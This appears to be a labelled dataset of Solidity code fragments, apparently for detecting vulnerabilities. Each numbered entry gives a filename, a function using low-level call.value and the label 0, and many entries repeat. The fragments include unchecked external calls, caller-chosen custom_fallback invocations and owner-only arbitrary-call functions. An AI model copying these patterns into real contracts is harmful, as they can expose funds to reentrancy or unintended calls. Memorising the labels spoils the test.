endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1122 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
1123 36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
1124 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1125 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1126 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1127 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1128 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
1129 29601.sol
function transferInternal(address from, address to, uint256 value, bytes data, bool useCustomFallback, string customFallback) internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(uint256 _time, address _from,address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
1130 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1131 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1132 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1133 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
1134 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
1135 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
1136 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
1137 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
1138 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1139 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1140 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1141 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1142 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1143 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1144 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1145 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1146 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1147 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1148 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1149 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1150 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1151 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1152 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1153 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1154 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1155 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1156 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1157 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1158 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1159 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1160 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1161 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1162 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1163 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1164 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1165 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1166 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1167 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1168 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1169 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1170 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1171 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1172 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1173 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1174 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1175 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1176 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1177 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1178 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1179 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1180 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1181 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
